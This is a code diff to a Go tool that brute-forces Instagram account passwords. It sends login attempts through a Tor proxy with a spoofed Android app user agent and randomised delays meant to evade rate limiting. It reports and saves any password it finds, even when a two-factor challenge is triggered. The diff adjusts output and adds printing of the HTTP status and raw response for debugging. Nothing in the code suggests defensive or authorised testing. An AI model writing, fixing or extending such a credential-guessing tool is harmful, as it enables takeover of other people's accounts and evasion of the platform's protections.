@@ -19,7 +19,7 @@ const (
 	API_URL      = "https://i.instagram.com/api/v1/"
 	USER_AGENT   = "Instagram 76.0.0.15.395 Android (24/7.0; 640dpi; 1440x2560; samsung; SM-G930F; herolte; samsungexynos8890; en_US; 138226743)"
 	TIMEOUT      = 10 * time.Second
-	CURRENT_TIME = "2025-05-24 11:17:30"
+	CURRENT_TIME = "2025-05-24 12:06:12"
 	CURRENT_USER = "monsmain"
 	TOR_PROXY    = "socks5://127.0.0.1:9150"
 )
@@ -81,21 +81,15 @@ func main() {
 		success, response := tryLogin(username, password)
 
 		if success || response.Message == "challenge_required" || response.ErrorType == "challenge_required" {
-                fmt.Printf("\n✅ PASSWORD FOUND: %s\n", password)
-                fmt.Printf("Username: %s\n", username)
-                fmt.Println("✅ Password is correct! (2FA/Challenge Required)")
-               saveResult(username, password, true)
-                return
-                } else {
-			if response.ErrorType == "bad_password" {
-				fmt.Println("❌ Invalid password")
-			} else if response.ErrorType == "invalid_user" {
-				fmt.Println("❌ Invalid username")
-				return
-			} else {
-				fmt.Printf("⚠️ Error: %s\n", response.Message)
-                                fmt.Printf("⚠️ Full Response: %+v\n", response)
-			}
+			fmt.Printf("\n✅ PASSWORD FOUND: %s\n", password)
+			fmt.Printf("Username: %s\n", username)
+			fmt.Println("✅ Password is correct! (2FA/Challenge Required)")
+			saveResult(username, password, true)
+			return
+		} else {
+			// نمایش کامل ریسپانس و وضعیت HTTP برای عیب‌یابی
+			fmt.Printf("⚠️ Error: %s | ErrorType: %s\n", response.Message, response.ErrorType)
+			fmt.Printf("⚠️ Full Response: %+v\n", response)
 		}
 
 		time.Sleep(time.Duration(rand.Intn(5)+5) * time.Second)
@@ -166,7 +160,8 @@ func tryLogin(username, password string) (bool, InstagramResponse) {
 		return false, InstagramResponse{}
 	}
 
-	log.Printf("Raw response: %s\n", string(body))
+	fmt.Printf("HTTP Status: %d\nRaw body: %s\n", resp.StatusCode, string(body))
+	log.Printf("HTTP Status: %d\nRaw body: %s\n", resp.StatusCode, string(body))
 
 	var response InstagramResponse
 	if err := json.Unmarshal(body, &response); err != nil {
